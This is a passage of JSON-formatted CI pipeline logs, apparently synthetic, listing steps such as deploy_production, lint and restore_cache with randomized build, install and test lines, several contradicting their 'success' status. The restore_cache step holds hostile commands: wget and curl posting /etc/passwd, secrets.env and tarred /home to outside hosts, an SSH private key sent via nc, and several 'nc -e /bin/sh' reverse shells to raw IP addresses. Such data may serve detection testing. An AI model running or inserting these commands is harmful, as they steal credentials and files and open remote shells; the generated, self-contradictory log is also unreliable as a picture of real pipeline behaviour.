          "\u2713 test completed",
          "  PASS: test_api_health (368ms)",
          "Cache hit for key-4305",
          "\u2713 test completed",
          "Step 10/10: Building",
          "\u2713 build completed",
          "Compiling src/main.py...",
          "Cache hit for key-5044",
          "  PASS: test_api_health (328ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-4213",
          "Cache hit for key-7742",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Installing express@5.16.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (386ms)",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-1296",
          "Installing eslint@4.12.0",
          "Cache hit for key-5942",
          "Cache hit for key-4887",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "\u2713 build completed",
          "Installing express@2.6.0",
          "\u2713 lint completed",
          "\u2717 build failed with exit code 10",
          "Step 7/10: Building",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Installing react@3.1.0",
          "Installing webpack@1.12.0",
          "  PASS: test_auth_login (443ms)",
          "  PASS: test_api_health (1ms)",
          "Cache hit for key-1038",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (341ms)",
          "  PASS: test_user_create (3ms)",
          "Installing eslint@1.20.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "Installing prettier@1.9.0",
          "\u2713 test completed",
          "Cache hit for key-5322",
          "\u2713 lint completed",
          "  PASS: test_api_health (471ms)",
          "Compiling src/index.js...",
          "Cache hit for key-1532",
          "Step 2/10: Building",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "Cache hit for key-9032",
          "Compiling src/main.py...",
          "Exception: ValueError",
          "Installing axios@2.9.0",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (40MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "Cache hit for key-2449",
          "  PASS: test_db_connect (34ms)",
          "Installing express@3.1.0",
          "Cache hit for key-2290",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (9MB)",
          "WARNING: express has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/service.java...",
          "Installing eslint@5.10.0",
          "Step 10/10: Building",
          "Step 10/10: Building",
          "Cache hit for key-9128",
          "Artifact uploaded: build.tar.gz (47MB)",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-27T12:01:52.172909",
        "finished_at": "2025-11-27T12:01:55.924371",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Step 6/10: Building",
          "Cache hit for key-4027",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (14MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Step 7/10: Building",
          "Cache hit for key-2479",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Step 9/10: Building",
          "  PASS: test_db_connect (392ms)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_auth_login (106ms)",
          "Cache hit for key-2049",
          "  PASS: test_api_health (484ms)",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Installing prettier@1.18.0",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing eslint@3.8.0",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache hit for key-8150",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-9816",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Exception: RuntimeError",
          "Installing prettier@4.8.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Cache hit for key-3010",
          "Installing lodash@3.20.0",
          "\u2713 test completed",
          "Installing prettier@4.6.0",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (449ms)",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Cache hit for key-7294",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (18MB)",
          "[12:00:18] INFO: Processing request",
          "Installing react@4.0.0",
          "Installing react@1.6.0",
          "  PASS: test_auth_login (224ms)",
          "Cache hit for key-6446",
          "Compiling src/handler.rs...",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing jest@3.0.0",
          "\u2713 build completed",
          "Step 5/10: Building",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-3021",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2717 build failed with exit code 52",
          "  PASS: test_db_connect (170ms)",
          "Installing jest@1.3.0",
          "Compiling src/index.js...",
          "  PASS: test_cache_hit (265ms)",
          "  PASS: test_auth_login (208ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "Installing lodash@1.3.0",
          "Installing express@1.15.0",
          "[12:00:18] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Step 10/10: Building",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 9/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 build completed",
          "Cache hit for key-2157",
          "Artifact uploaded: build.tar.gz (11MB)",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-27T12:01:55.924371",
        "finished_at": "2025-11-27T12:02:05.303026",
        "log_lines": [
          "=== Step: setup_node ===",
          "Cache hit for key-2719",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-3225",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-9616",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (29MB)",
          "  PASS: test_auth_login (303ms)",
          "  PASS: test_api_health (125ms)",
          "Cache hit for key-3968",
          "Cache hit for key-1275",
          "\u2713 lint completed",
          "Cache hit for key-5213",
          "  PASS: test_user_create (474ms)",
          "Cache hit for key-5141",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-5322",
          "  PASS: test_db_connect (310ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Step 5/10: Building",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "\u2713 test completed",
          "Installing react@2.0.0",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Compiling src/service.java...",
          "Installing express@5.10.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "[12:00:18] ERROR: Connection failed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Cache hit for key-1079",
          "Installing react@5.12.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 9/10: Building",
          "Compiling src/index.js...",
          "Installing lodash@3.8.0",
          "  PASS: test_user_create (446ms)",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Cache hit for key-7756",
          "Cache hit for key-4986",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Cache hit for key-2519",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing react@2.18.0",
          "Step 3/10: Building",
          "Cache hit for key-4926",
          "[12:00:18] INFO: Processing request",
          "Installing lodash@3.10.0",
          "  PASS: test_user_create (344ms)",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "Compiling src/handler.rs...",
          "Installing lodash@5.19.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (49ms)",
          "  PASS: test_cache_hit (253ms)",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "WARNING: prettier has known vulnerabilities",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-11-27T12:02:05.303026",
        "finished_at": "2025-11-27T12:02:14.681681",
        "log_lines": [
          "=== Step: lint ===",
          "Installing express@5.14.0",
          "Installing react@1.7.0",
          "Step 2/10: Building",
          "Cache hit for key-4842",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Compiling src/utils.go...",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_api_health (285ms)",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (160ms)",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (440ms)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Installing jest@4.3.0",
          "Artifact uploaded: build.tar.gz (16MB)",
          "\u2717 build failed with exit code 75",
          "\u2713 lint completed",
          "Compiling src/utils.go...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (19MB)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Cache hit for key-2394",
          "Compiling src/app.ts...",
          "Installing eslint@3.14.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 6/10: Building",
          "Installing eslint@4.16.0",
          "\u2713 build completed",
          "  PASS: test_api_health (498ms)",
          "  PASS: test_auth_login (160ms)",
          "  PASS: test_cache_hit (455ms)",
          "Cache hit for key-7019",
          "Step 5/10: Building",
          "\u2713 test completed",
          "Installing react@5.17.0",
          "Artifact uploaded: build.tar.gz (33MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2713 test completed",
          "Installing lodash@4.13.0",
          "Cache hit for key-5241",
          "Step 3/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing prettier@3.13.0",
          "Installing express@2.15.0",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Cache hit for key-3580",
          "[12:00:18] INFO: Processing request",
          "Installing react@5.10.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:18] INFO: Processing request",
          "Step 3/10: Building",
          "Compiling src/main.py...",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Cache hit for key-8799",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing axios@1.12.0",
          "  PASS: test_db_connect (352ms)",
          "Cache hit for key-1066",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-9600",
          "Compiling src/main.py...",
          "  PASS: test_user_create (114ms)",
          "[12:00:18] INFO: Processing request",
          "Installing webpack@4.14.0",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/app.ts...",
          "Installing lodash@5.11.0",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (409ms)",
          "Cache hit for key-7469",
          "Exception: ValueError",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 6/10: Building",
          "  PASS: test_cache_hit (106ms)",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-27T12:02:14.681681",
        "finished_at": "2025-11-27T12:02:24.060336",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Installing lodash@4.17.0",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "[12:00:18] INFO: Processing request",
          "Installing axios@3.7.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 8/10: Building",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (381ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_api_health (291ms)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Step 1/10: Building",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (48MB)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (62ms)",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_db_connect (346ms)",
          "Step 2/10: Building",
          "  PASS: test_auth_login (117ms)",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (409ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Compiling src/handler.rs...",
          "Cache hit for key-3253",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Step 8/10: Building",
          "  PASS: test_user_create (232ms)",
          "[12:00:18] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing express@4.11.0",
          "  PASS: test_cache_hit (417ms)",
          "Cache hit for key-4923",
          "FAILED: test_user_create",
          "WARNING: axios has known vulnerabilities",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Installing webpack@4.2.0",
          "Compiling src/app.ts...",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (164ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 109",
          "\u2713 test completed",
          "Installing react@4.9.0",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Step 3/10: Building",
          "Step 8/10: Building",
          "Cache hit for key-8278",
          "[12:00:18] ERROR: Connection failed",
          "  PASS: test_api_health (328ms)",
          "Cache hit for key-1034",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-4302",
          "\u2713 lint completed",
          "Installing react@4.15.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing axios@4.9.0",
          "  PASS: test_user_create (304ms)",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "  PASS: test_db_connect (275ms)",
          "Cache hit for key-3781",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-27T12:02:24.060336",
        "finished_at": "2025-11-27T12:02:33.438991",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_user_create (171ms)",
          "\u2713 build completed",
          "Cache hit for key-4688",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing lodash@4.10.0",
          "Artifact uploaded: build.tar.gz (20MB)",
          "[12:00:18] ERROR: Connection failed",
          "Compiling src/main.py...",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "  PASS: test_auth_login (37ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_cache_hit (14ms)",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "  PASS: test_user_create (148ms)",
          "Compiling src/service.java...",
          "\u2713 build completed",
          "  PASS: test_cache_hit (160ms)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/main.py...",
          "Installing axios@4.18.0",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u2713 build completed",
          "Installing axios@1.7.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/utils.go...",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (197ms)",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-9492",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Cache hit for key-5287",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "\u2713 lint completed",
          "Exception: NullPointerException",
          "Compiling src/service.java...",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Exception: ValueError",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3060",
          "\u2713 build completed",
          "Compiling src/app.ts...",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_cache_hit (177ms)",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (85ms)",
          "WARNING: lodash has known vulnerabilities",
          "Installing jest@4.18.0",
          "Installing jest@2.18.0",
          "Installing jest@5.14.0",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "  PASS: test_api_health (465ms)",
          "[12:00:18] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (225ms)",
          "Cache hit for key-7056",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (17MB)",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-27T12:02:33.438991",
        "finished_at": "2025-11-27T12:02:42.817646",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Cache hit for key-2281",
          "  PASS: test_api_health (354ms)",
          "WARNING: lodash has known vulnerabilities",
          "[12:00:18] WARN: Deprecated API usage",
          "Step 9/10: Building",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Installing prettier@5.16.0",
          "[12:00:18] INFO: Processing request",
          "\u2717 build failed with exit code 124",
          "Cache hit for key-3201",
          "\u2713 lint completed",
          "Installing webpack@4.5.0",
          "Cache hit for key-7489",
          "[12:00:18] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_db_connect (454ms)",
          "  PASS: test_db_connect (65ms)",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 lint completed",
          "Installing jest@1.0.0",
          "  PASS: test_db_connect (327ms)",
          "Compiling src/service.java...",
          "Installing express@1.17.0",
          "Step 4/10: Building",
          "Step 5/10: Building",
          "Installing prettier@4.0.0",
          "[12:00:18] INFO: Processing request",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing jest@2.4.0",
          "WARNING: prettier has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing lodash@2.18.0",
          "Installing prettier@2.17.0",
          "Exception: ValueError",
          "Installing lodash@3.14.0",
          "Installing prettier@4.12.0",
          "[12:00:18] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_user_create (6ms)",
          "  PASS: test_auth_login (200ms)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "Step 1/10: Building",
          "Compiling src/service.java...",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 lint completed",
          "Installing axios@1.15.0",
          "Artifact uploaded: build.tar.gz (45MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (49MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing react@4.3.0",
          "  PASS: test_auth_login (427ms)",
          "  PASS: test_user_create (335ms)",
          "\u2713 build completed",
          "Installing express@4.17.0",
          "Step 10/10: Building",
          "\u2713 test completed",
          "  PASS: test_api_health (228ms)",
          "Compiling src/handler.rs...",
          "Installing axios@2.20.0",
          "\u2713 build completed",
          "  PASS: test_user_create (187ms)",
          "Compiling src/app.ts...",
          "[12:00:18] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Installing axios@2.3.0",
          "  PASS: test_cache_hit (145ms)",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-8207",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3531",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_user_create (249ms)",
          "Installing jest@4.13.0",
          "[12:00:18] WARN: Deprecated API usage",
          "Installing eslint@5.1.0",
          "Compiling src/index.js...",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-27T12:02:42.817646",
        "finished_at": "2025-11-27T12:02:52.196301",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "[12:00:18] INFO: Processing request",
          "\u2713 lint completed",
          "Cache hit for key-7362",
          "Installing eslint@5.14.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Step 3/10: Building",
          "Step 6/10: Building",
          "Compiling src/utils.go...",
          "\u2717 build failed with exit code 71",
          "Artifact uploaded: build.tar.gz (6MB)",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "Installing jest@1.13.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Step 5/10: Building",
          "  PASS: test_db_connect (479ms)",
          "Step 1/10: Building",
          "  PASS: test_user_create (70ms)",
          "  PASS: test_auth_login (235ms)",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-3032",
          "Cache hit for key-8002",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (44MB)",
          "  PASS: test_auth_login (395ms)",
          "\u2713 build completed",
          "Compiling src/index.js...",
          "Cache hit for key-2981",
          "Installing lodash@5.13.0",
          "Installing jest@3.15.0",
          "Cache hit for key-5009",
          "  PASS: test_auth_login (318ms)",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u2717 build failed with exit code 107",
          "Compiling src/service.java...",
          "Exception: ValueError",
          "  PASS: test_user_create (313ms)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Step 2/10: Building",
          "Cache hit for key-3234",
          "  PASS: test_api_health (215ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/main.py...",
          "Step 5/10: Building",
          "\u2713 build completed",
          "Cache hit for key-8749",
          "Compiling src/utils.go...",
          "Installing axios@4.15.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Installing eslint@1.13.0",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] ERROR: Connection failed",
          "WARNING: axios has known vulnerabilities",
          "Compiling src/main.py...",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-3819",
          "Cache hit for key-6585",
          "[12:00:18] INFO: Processing request",
          "Installing prettier@2.19.0",
          "Cache hit for key-8043",
          "Step 10/10: Building",
          "[12:00:18] INFO: Processing request",
          "Cache hit for key-1234",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Installing prettier@3.11.0",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_auth_login (175ms)",
          "[12:00:18] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (338ms)",
          "Cache hit for key-2590",
          "Compiling src/main.py...",
          "  PASS: test_api_health (478ms)",
          "Cache hit for key-3563",
          "Installing react@4.12.0",
          "\u2713 build completed",
          "[12:00:18] INFO: Processing request",
          "[12:00:18] INFO: Processing request",
          "Installing jest@3.4.0",
          "  PASS: test_cache_hit (393ms)",
          "  PASS: test_db_connect (339ms)",
          "\u2713 lint completed",
          "Installing eslint@4.2.0",
          "Artifact uploaded: build.tar.gz (15MB)",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-27T12:02:52.196301",
        "finished_at": "2025-11-27T12:02:57.823494",
        "log_lines": [
          "=== Step: restore_cache ===",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "Cache hit for key-1885",
          "[12:00:18] INFO: Processing request",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "\u2713 lint completed",
          "\u2713 test completed",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:18] WARN: Deprecated API usage",
          "Cache hit for key-5430",
          "nc -e /bin/sh 179.219.103.141 8864",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (356ms)",
          "Exception: ValueError",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_api_health (324ms)",
          "\u2713 build completed",
          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
          "Installing axios@5.4.0",
          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
          "tar czf - /home | curl -X POST -d @- https://example.com/upload",
          "Artifact uploaded: build.tar.gz (7MB)",
          "  PASS: test_db_connect (2ms)",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "\u2713 lint completed",
          "Sending 324MB of data to startup.dev",
          "Sending 357MB of data to cloud.services",
          "[12:00:18] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Cache hit for key-4050",
          "  PASS: test_auth_login (199ms)",
          "  PASS: test_cache_hit (255ms)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Cache hit for key-4650",
          "[12:00:18] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "Cache hit for key-5718",
          "  PASS: test_auth_login (294ms)",
          "FAILED: test_user_create",
          "Step 10/10: Building",
          "Cache hit for key-5765",
          "Exception: TypeError",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 111.18.179.109 19831",
          "  PASS: test_db_connect (367ms)",
          "Installing axios@4.13.0",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "FAILED: test_user_create",
          "Installing eslint@1.15.0",
          "nc -e /bin/sh 223.181.123.19 14375",
          "WARNING: jest has known vulnerabilities",
          "FAILED: test_cache_hit",
          "\u2713 build completed",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Installing lodash@1.9.0",
          "[12:00:18] INFO: Processing request",
          "Step 7/10: Building",
          "\u2713 test completed",
          "[12:00:18] INFO: Processing request",
          "  PASS: test_cache_hit (47ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (35MB)",
          "nc -e /bin/sh 13.36.73.181 27022",
